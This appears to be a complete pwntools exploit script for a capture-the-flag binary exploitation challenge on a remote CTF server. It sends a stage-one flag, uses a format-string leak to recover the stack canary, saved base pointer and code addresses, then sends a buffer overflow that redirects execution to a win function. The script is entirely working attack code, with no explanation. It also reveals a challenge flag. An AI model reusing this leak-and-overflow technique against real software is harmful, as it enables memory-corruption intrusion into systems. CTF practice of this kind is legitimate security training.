from pwn import *

#p = process("./pwn2/pwn2")
p = remote("hax1.allesctf.net", 9101)

#first_psswd = "CSCG{THIS_IS_TEST_FLAG}"
first_psswd = "CSCG{NOW_PRACTICE_MORE}"

p.recvuntil("Enter the password of stage 1:")
p.sendline(first_psswd)

format_string = "%41$p " + "%p " * 50

p.recvuntil("Enter your witch name:")
print("Sending format string...")
p.sendline(format_string)

format_result = p.recvuntil("enter your magic spell")
stack = (format_result.split())[8:-4]

print("STACK:")
print(stack)

main_after_welcome = int(stack[0], 16) # %41$p
main_to_WIN = -0x231
WIN = main_after_welcome + main_to_WIN
print("WIN at: " + str(hex(WIN)))

#cyclic_pattern = cyclic(0xff + 0x1f)

padding1 = "A" * 251
rop_gadget = main_after_welcome + 0xc
print("rop gadget at: " + str(hex(rop_gadget)))
rbp = int(stack[-11], 16)
print("rbp is: " + str(hex(rbp)))
cannary = int(stack[-12], 16)
print("cannary is: " + str(hex(cannary)))
#padding2 = "A" * ((259 - 251) - 4 - 4)

#raw_input("Attach gdb")
print("Sending bufferoverflow")

p.sendline("Expelliarmus\x00" + padding1 + p64(cannary) + p64(rbp) + p64(rop_gadget) + p64(WIN))

p.interactive()
